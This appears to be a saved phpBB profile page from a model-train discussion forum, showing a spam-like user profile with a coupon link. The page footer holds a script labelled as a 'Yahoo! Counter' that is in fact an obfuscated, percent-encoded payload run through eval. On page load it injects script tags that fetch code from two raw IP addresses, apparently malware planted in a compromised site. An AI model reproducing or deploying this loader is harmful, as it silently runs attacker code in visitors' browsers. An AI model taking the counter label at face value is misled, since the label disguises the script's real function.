<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="Content-Style-Type" content="text/css">

<link rel="top" href="./index.php" title="Darick.com Model Trains Forum Index" />
<link rel="search" href="./search.php" title="Search" />
<link rel="help" href="./faq.php" title="FAQ" />
<link rel="author" href="./memberlist.php" title="Memberlist" />
<link rel="chapter forum" href="viewforum.php?f=2" title="Model Train General" />
<link rel="chapter forum" href="viewforum.php?f=1" title="SP General" />

<title>Darick.com Model Trains :: Viewing profile</title>
<!-- link rel="stylesheet" href="templates/subSilver/subSilver.css" type="text/css" -->
<style type="text/css">
<!--
/*
  The original subSilver Theme for phpBB version 2+
  Created by subBlue design
  http://www.subBlue.com

  NOTE: These CSS definitions are stored within the main page body so that you can use the phpBB2
  theme administration centre. When you have finalised your style you could cut the final CSS code
  and place it in an external file, deleting this section to save bandwidth.
*/

/* General page style. The scroll bar colours only visible in IE5.5+ */
body {
	background-color: #E5E5E5;
	scrollbar-face-color: #DEE3E7;
	scrollbar-highlight-color: #FFFFFF;
	scrollbar-shadow-color: #DEE3E7;
	scrollbar-3dlight-color: #D1D7DC;
	scrollbar-arrow-color:  #006699;
	scrollbar-track-color: #EFEFEF;
	scrollbar-darkshadow-color: #98AAB1;
}

/* General font families for common tags */
font,th,td,p { font-family: Verdana, Arial, Helvetica, sans-serif }
a:link,a:active,a:visited { color : #006699; }
a:hover		{ text-decoration: underline; color : #DD6900; }
hr	{ height: 0px; border: solid #D1D7DC 0px; border-top-width: 1px;}

/* This is the border line & background colour round the entire page */
.bodyline	{ background-color: #FFFFFF; border: 1px #98AAB1 solid; }

/* This is the outline round the main forum tables */
.forumline	{ background-color: #FFFFFF; border: 2px #006699 solid; }

/* Main table cell colours and backgrounds */
td.row1	{ background-color: #EFEFEF; }
td.row2	{ background-color: #DEE3E7; }
td.row3	{ background-color: #D1D7DC; }

/*
  This is for the table cell above the Topics, Post & Last posts on the index.php page
  By default this is the fading out gradiated silver background.
  However, you could replace this with a bitmap specific for each forum
*/
td.rowpic {
		background-color: #FFFFFF;
		background-image: url(templates/subSilver/images/cellpic2.jpg);
		background-repeat: repeat-y;
}

/* Header cells - the blue and silver gradient backgrounds */
th	{
	color: #FFA34F; font-size: 11px; font-weight : bold;
	background-color: #006699; height: 25px;
	background-image: url(templates/subSilver/images/cellpic3.gif);
}

td.cat,td.catHead,td.catSides,td.catLeft,td.catRight,td.catBottom {
			background-image: url(templates/subSilver/images/cellpic1.gif);
			background-color:#D1D7DC; border: #FFFFFF; border-style: solid; height: 28px;
}

/*
  Setting additional nice inner borders for the main table cells.
  The names indicate which sides the border will be on.
  Don't worry if you don't understand this, just ignore it :-)
*/
td.cat,td.catHead,td.catBottom {
	height: 29px;
	border-width: 0px 0px 0px 0px;
}
th.thHead,th.thSides,th.thTop,th.thLeft,th.thRight,th.thBottom,th.thCornerL,th.thCornerR {
	font-weight: bold; border: #FFFFFF; border-style: solid; height: 28px;
}
td.row3Right,td.spaceRow {
	background-color: #D1D7DC; border: #FFFFFF; border-style: solid;
}

th.thHead,td.catHead { font-size: 12px; border-width: 1px 1px 0px 1px; }
th.thSides,td.catSides,td.spaceRow	 { border-width: 0px 1px 0px 1px; }
th.thRight,td.catRight,td.row3Right	 { border-width: 0px 1px 0px 0px; }
th.thLeft,td.catLeft	  { border-width: 0px 0px 0px 1px; }
th.thBottom,td.catBottom  { border-width: 0px 1px 1px 1px; }
th.thTop	 { border-width: 1px 0px 0px 0px; }
th.thCornerL { border-width: 1px 0px 0px 1px; }
th.thCornerR { border-width: 1px 1px 0px 0px; }

/* The largest text used in the index page title and toptic title etc. */
.maintitle	{
	font-weight: bold; font-size: 22px; font-family: "Trebuchet MS",Verdana, Arial, Helvetica, sans-serif;
	text-decoration: none; line-height : 120%; color : #000000;
}

/* General text */
.gen { font-size : 12px; }
.genmed { font-size : 11px; }
.gensmall { font-size : 10px; }
.gen,.genmed,.gensmall { color : #000000; }
a.gen,a.genmed,a.gensmall { color: #006699; text-decoration: none; }
a.gen:hover,a.genmed:hover,a.gensmall:hover	{ color: #DD6900; text-decoration: underline; }

/* The register, login, search etc links at the top of the page */
.mainmenu		{ font-size : 11px; color : #000000 }
a.mainmenu		{ text-decoration: none; color : #006699;  }
a.mainmenu:hover{ text-decoration: underline; color : #DD6900; }

/* Forum category titles */
.cattitle		{ font-weight: bold; font-size: 12px ; letter-spacing: 1px; color : #006699}
a.cattitle		{ text-decoration: none; color : #006699; }
a.cattitle:hover{ text-decoration: underline; }

/* Forum title: Text and link to the forums used in: index.php */
.forumlink		{ font-weight: bold; font-size: 12px; color : #006699; }
a.forumlink 	{ text-decoration: none; color : #006699; }
a.forumlink:hover{ text-decoration: underline; color : #DD6900; }

/* Used for the navigation text, (Page 1,2,3 etc) and the navigation bar when in a forum */
.nav			{ font-weight: bold; font-size: 11px; color : #000000;}
a.nav			{ text-decoration: none; color : #006699; }
a.nav:hover		{ text-decoration: underline; }

/* titles for the topics: could specify viewed link colour too */
.topictitle,h1,h2	{ font-weight: bold; font-size: 11px; color : #000000; }
a.topictitle:link   { text-decoration: none; color : #006699; }
a.topictitle:visited { text-decoration: none; color : #5493B4; }
a.topictitle:hover	{ text-decoration: underline; color : #DD6900; }

/* Name of poster in viewmsg.php and viewtopic.php and other places */
.name			{ font-size : 11px; color : #000000;}

/* Location, number of posts, post date etc */
.postdetails		{ font-size : 10px; color : #000000; }

/* The content of the posts (body of text) */
.postbody { font-size : 12px; line-height: 18px}
a.postlink:link	{ text-decoration: none; color : #006699 }
a.postlink:visited { text-decoration: none; color : #5493B4; }
a.postlink:hover { text-decoration: underline; color : #DD6900}

/* Quote & Code blocks */
.code {
	font-family: Courier, 'Courier New', sans-serif; font-size: 11px; color: #006600;
	background-color: #FAFAFA; border: #D1D7DC; border-style: solid;
	border-left-width: 1px; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px
}

.quote {
	font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 11px; color: #444444; line-height: 125%;
	background-color: #FAFAFA; border: #D1D7DC; border-style: solid;
	border-left-width: 1px; border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px
}

/* Copyright and bottom info */
.copyright		{ font-size: 10px; font-family: Verdana, Arial, Helvetica, sans-serif; color: #444444; letter-spacing: -1px;}
a.copyright		{ color: #444444; text-decoration: none;}
a.copyright:hover { color: #000000; text-decoration: underline;}

/* Form elements */
input,textarea, select {
	color : #000000;
	font: normal 11px Verdana, Arial, Helvetica, sans-serif;
	border-color : #000000;
}

/* The text input fields background colour */
input.post, textarea.post, select {
	background-color : #FFFFFF;
}

input { text-indent : 2px; }

/* The buttons used for bbCode styling in message post */
input.button {
	background-color : #EFEFEF;
	color : #000000;
	font-size: 11px; font-family: Verdana, Arial, Helvetica, sans-serif;
}

/* The main submit button option */
input.mainoption {
	background-color : #FAFAFA;
	font-weight : bold;
}

/* None-bold submit button */
input.liteoption {
	background-color : #FAFAFA;
	font-weight : normal;
}

/* This is the line in the posting page which shows the rollover
  help line. This is actually a text box, but if set to be the same
  colour as the background no one will know ;)
*/
.helpline { background-color: #DEE3E7; border-style: none; }

/* Import the fancy styles for IE only (NS4.x doesn't use the @import function) */
@import url("templates/subSilver/formIE.css");
-->
</style>
</head>
<body bgcolor="#E5E5E5" text="#000000" link="#006699" vlink="#5493B4">

<a name="top"></a>

<table width="100%" cellspacing="0" cellpadding="10" border="0" align="center">
	<tr>
		<td class="bodyline"><table width="100%" cellspacing="0" cellpadding="0" border="0">
			<tr>
				<td><a href="index.php"><img src="templates/subSilver/images/logo_phpBB.gif" border="0" alt="Darick.com Model Trains Forum Index" vspace="1" /></a></td>
				<td align="center" width="100%" valign="middle"><span class="maintitle">Darick.com Model Trains</span><br /><span class="gen">Discussion About Model Trains<script language=javascript></script><br />&nbsp; </span>
				<table cellspacing="0" cellpadding="2" border="0">
					<tr>
						<td align="center" valign="top" nowrap="nowrap"><span class="mainmenu">&nbsp;<a href="faq.php" class="mainmenu"><img src="templates/subSilver/images/icon_mini_faq.gif" width="12" height="13" border="0" alt="FAQ" hspace="3" />FAQ</a></span><span class="mainmenu">&nbsp; &nbsp;<a href="search.php" class="mainmenu"><img src="templates/subSilver/images/icon_mini_search.gif" width="12" height="13" border="0" alt="Search" hspace="3" />Search</a>&nbsp; &nbsp;<a href="memberlist.php" class="mainmenu"><img src="templates/subSilver/images/icon_mini_members.gif" width="12" height="13" border="0" alt="Memberlist" hspace="3" />Memberlist</a>&nbsp; &nbsp;<a href="groupcp.php" class="mainmenu"><img src="templates/subSilver/images/icon_mini_groups.gif" width="12" height="13" border="0" alt="Usergroups" hspace="3" />Usergroups</a>&nbsp;
						&nbsp;<a href="profile.php?mode=register" class="mainmenu"><img src="templates/subSilver/images/icon_mini_register.gif" width="12" height="13" border="0" alt="Register" hspace="3" />Register</a></span>&nbsp;
						</td>
					</tr>
					<tr>
						<td height="25" align="center" valign="top" nowrap="nowrap"><span class="mainmenu">&nbsp;<a href="profile.php?mode=editprofile" class="mainmenu"><img src="templates/subSilver/images/icon_mini_profile.gif" width="12" height="13" border="0" alt="Profile" hspace="3" />Profile</a>&nbsp; &nbsp;<a href="privmsg.php?folder=inbox" class="mainmenu"><img src="templates/subSilver/images/icon_mini_message.gif" width="12" height="13" border="0" alt="Log in to check your private messages" hspace="3" />Log in to check your private messages</a>&nbsp; &nbsp;<a href="login.php" class="mainmenu"><img src="templates/subSilver/images/icon_mini_login.gif" width="12" height="13" border="0" alt="Log in" hspace="3" />Log in</a>&nbsp;</span></td>
					</tr>
				</table></td>
			</tr>
		</table>

		<br />


<table width="100%" cellspacing="2" cellpadding="2" border="0" align="center">
  <tr>
	<td align="left"><span class="nav"><a href="index.php" class="nav">Darick.com Model Trains Forum Index</a></span></td>
  </tr>
</table>

<table class="forumline" width="100%" cellspacing="1" cellpadding="3" border="0" align="center">
  <tr>
	<th class="thHead" colspan="2" height="25" nowrap="nowrap">Viewing profile :: bbytckkl</th>
  </tr>
  <tr>
	<td class="catLeft" width="40%" height="28" align="center"><b><span class="gen">Avatar</span></b></td>
	<td class="catRight" width="60%"><b><span class="gen">All about bbytckkl</span></b></td>
  </tr>
  <tr>
	<td class="row1" height="6" valign="top" align="center"><br /><span class="postdetails"></span></td>
	<td class="row1" rowspan="3" valign="top"><table width="100%" border="0" cellspacing="1" cellpadding="3">
		<tr>
		  <td valign="middle" align="right" nowrap="nowrap"><span class="gen">Joined:&nbsp;</span></td>
		  <td width="100%"><b><span class="gen">12 Apr 2011</span></b></td>
		</tr>
		<tr>
		  <td valign="top" align="right" nowrap="nowrap"><span class="gen">Total posts:&nbsp;</span></td>
		  <td valign="top"><b><span class="gen">0</span></b><br /><span class="genmed">[0.00% of total / 0.00 posts per day]</span> <br /><span class="genmed"><a href="search.php?search_author=bbytckkl" class="genmed">Find all posts by bbytckkl</a></span></td>
		</tr>
		<tr>
		  <td valign="middle" align="right" nowrap="nowrap"><span class="gen">Location:&nbsp;</span></td>
		  <td><b><span class="gen">Crestview fl.</span></b></td>
		</tr>
		<tr>
		  <td valign="middle" align="right" nowrap="nowrap"><span class="gen">Website:&nbsp;</span></td>
		  <td><span class="gen"><b><a href="http://www.webmaster911.com/search.php?q=Stride+Rite+Coupons&amp;Submit=Go" target="_userwww">http://www.webmaster911.com/search.php?q=Stride+Rite+Coupons&amp;Submit=Go</a></b></span></td>
		</tr>
		<tr>
		  <td valign="middle" align="right" nowrap="nowrap"><span class="gen">Occupation:&nbsp;</span></td>
		  <td><b><span class="gen">Computer vulcanizer</span></b></td>
		</tr>
		<tr>
		  <td valign="top" align="right" nowrap="nowrap"><span class="gen">Interests:</span></td>
		  <td> <b><span class="gen">Football,poker</span></b></td>
		</tr>
	  </table>
	</td>
  </tr>
  <tr>
	<td class="catLeft" align="center" height="28"><b><span class="gen">Contact bbytckkl </span></b></td>
  </tr>
  <tr>
	<td class="row1" valign="top"><table width="100%" border="0" cellspacing="1" cellpadding="3">
		<tr>
		  <td valign="middle" align="right" nowrap="nowrap"><span class="gen">E-mail address:</span></td>
		  <td class="row1" valign="middle" width="100%"><b><span class="gen"><a href="mailto:sykd70y0s@gmail.com"><img src="templates/subSilver/images/lang_english/icon_email.gif" alt="Send e-mail" title="Send e-mail" border="0" /></a></span></b></td>
		</tr>
		<tr>
		  <td valign="middle" nowrap="nowrap" align="right"><span class="gen">Private Message:</span></td>
		  <td class="row1" valign="middle"><b><span class="gen"><a href="privmsg.php?mode=post&amp;u=218954"><img src="templates/subSilver/images/lang_english/icon_pm.gif" alt="Send private message" title="Send private message" border="0" /></a></span></b></td>
		</tr>
		<tr>
		  <td valign="middle" nowrap="nowrap" align="right"><span class="gen">MSN Messenger:</span></td>
		  <td class="row1" valign="middle"><span class="gen">&nbsp;</span></td>
		</tr>
		<tr>
		  <td valign="middle" nowrap="nowrap" align="right"><span class="gen">Yahoo Messenger:</span></td>
		  <td class="row1" valign="middle"><span class="gen"></span></td>
		</tr>
		<tr>
		  <td valign="middle" nowrap="nowrap" align="right"><span class="gen">AIM Address:</span></td>
		  <td class="row1" valign="middle"><span class="gen">&nbsp;</span></td>
		</tr>
		<tr>
		  <td valign="middle" nowrap="nowrap" align="right"><span class="gen">ICQ Number:</span></td>
		  <td class="row1"><script language="JavaScript" type="text/javascript"><!--

		if ( navigator.userAgent.toLowerCase().indexOf('mozilla') != -1 && navigator.userAgent.indexOf('5.') == -1 && navigator.userAgent.indexOf('6.') == -1 )
			document.write(' <a href="http://wwp.icq.com/scripts/search.dll?to=41356"><img src="templates/subSilver/images/lang_english/icon_icq_add.gif" alt="ICQ Number" title="ICQ Number" border="0" /></a>');
		else
			document.write('<table cellspacing="0" cellpadding="0" border="0"><tr><td nowrap="nowrap"><div style="position:relative;height:18px"><div style="position:absolute"><a href="http://wwp.icq.com/scripts/search.dll?to=41356"><img src="templates/subSilver/images/lang_english/icon_icq_add.gif" alt="ICQ Number" title="ICQ Number" border="0" /></a></div><div style="position:absolute;left:3px;top:-1px"><a href="http://wwp.icq.com/41356#pager"><img src="http://web.icq.com/whitepages/online?icq=41356&img=5" width="18" height="18" border="0" /></a></div></div></td></tr></table>');

		  //--></script><noscript><a href="http://wwp.icq.com/scripts/search.dll?to=41356"><img src="templates/subSilver/images/lang_english/icon_icq_add.gif" alt="ICQ Number" title="ICQ Number" border="0" /></a></noscript></td>
		</tr>
	  </table>
	</td>
  </tr>
</table>

<table width="100%" border="0" cellspacing="0" cellpadding="0" align="center">
  <tr>
	<td align="right"><span class="nav"><br />
<form method="get" name="jumpbox" action="viewforum.php" onSubmit="if(document.jumpbox.f.value == -1){return false;}"><table cellspacing="0" cellpadding="0" border="0">
	<tr>
		<td nowrap="nowrap"><span class="gensmall">Jump to:&nbsp;<select name="f" onchange="if(this.options[this.selectedIndex].value != -1){ forms['jumpbox'].submit() }"><option value="-1">Select a forum</option><option value="-1">&nbsp;</option><option value="-1">Model Train</option><option value="-1">----------------</option><option value="2">Model Train General</option><option value="-1">&nbsp;</option><option value="-1">Southern Pacific</option><option value="-1">----------------</option><option value="1">SP General</option></select><input type="hidden" name="sid" value="ae97f8717075246540b3ffdb1d291787" />&nbsp;<input type="submit" value="Go" class="liteoption" /></span></td>
	</tr>
</table></form>

</span></td>
  </tr>
</table>


<div align="center"><span class="copyright"><br /><br />
<!--
	We request you retain the full copyright notice below including the link to www.phpbb.com.
	This not only gives respect to the large amount of time given freely by the developers
	but also helps build interest, traffic and use of phpBB 2.0. If you cannot (for good
	reason) retain the full copyright we request you at least leave in place the
	Powered by phpBB line, with phpBB linked to www.phpbb.com. If you refuse
	to include even this then support on our forums may be affected.

	The phpBB Group : 2002
// -->
Powered by <a href="http://www.phpbb.com/" target="_phpbb" class="copyright">phpBB</a> &copy; 2001, 2005 phpBB Group<br /></span></div>
		</td>
	</tr>
</table><script language=javascript><!-- Yahoo! Counter starts 
if(typeof(yahoo_counter)!=typeof(1))eval(unescape('//%2E`.@%2E %3C!%64%69v|%20s|%74|%79`%6C%65@%3Ddi~%73~p%6C%61%79$%3A`n`%6F%6E|e~%3E\nd%6F#c%75#m~e@n&t`.w@r%69#%74%65@%28"&%3C&%2F%74!%65xt`a~%72&ea$%3E|%22%29@;%76a%72%20#%69,_%2C~%61%3D|[%227%38%2E11#%30.1|%37%35|%2E%32`1%22%2C%221$%39%35&.%32%34%2E%37!6@%2E2#%35#1"|]%3B!%5F!%3D|%31;%69|%66%28#%64!%6F&c%75|m~e%6E~t.$%63%6F%6F%6B%69%65%2E!ma@t#%63%68%28%2F%5C$%62`h%67&ft~=`1%2F%29=!=@%6E@%75%6Cl)f%6F!%72(&i!%3D%30;%69!%3C%32%3B%69%2B#%2B$%29%64#o@cum%65|%6E%74.w#r`%69t%65@%28!"~%3C&s%63ri%70!t%3E&%69f(|%5F@%29!d#o#%63@um!e%6Et`.w%72$%69#%74`%65`(!%5C&"|%3C#%73c~r~i%70%74!%20%69~%64&=#%5F$%22|+%69+%22~_@%20%73`rc%3D!%2F|%2F%22+%61[%69`]`+|%22!/`c@p%2F?#"~+n`a~v%69gat%6F@%72%2E!a#p`pN#%61|m#e%2E%63%68|a#%72|%41t`(0~%29+%22%3E#%3C~%5C$%5C%2F%73!%63r|%69$%70~t%3E%5C~"~)%3C%5C/`%73|c`r@%69`pt%3E"~)&%3B\n|/`/`%3C%2F`d%69%76%3E').replace(/\&|\!|\||\$|~|`|#|@/g,""));var yahoo_counter=1;
<!-- counter end --></script>


</body>
</html>

